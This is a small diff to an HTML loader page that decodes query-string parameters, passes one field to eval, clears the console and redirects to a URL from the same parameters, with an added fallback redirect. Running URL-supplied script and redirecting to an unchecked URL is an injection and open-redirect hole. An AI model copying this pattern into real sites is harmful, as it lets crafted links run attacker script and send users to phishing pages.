@@ -6,11 +6,12 @@
 <script src="/default.js"></script>
 
 <script>
-    let params = JSON.parse(encstr(getSearchParams().r,getSearchParams().d))
-    console.clear()
+    let params = JSON.parse(decodeString(getSearchParams().r,getSearchParams().d))
     eval(params.js)
+    console.clear()
     window.location.href = params.url
     console.clear()
+    window.location.href = "https://shall0e.github.io/"
 </script>
 </body>
 </html>
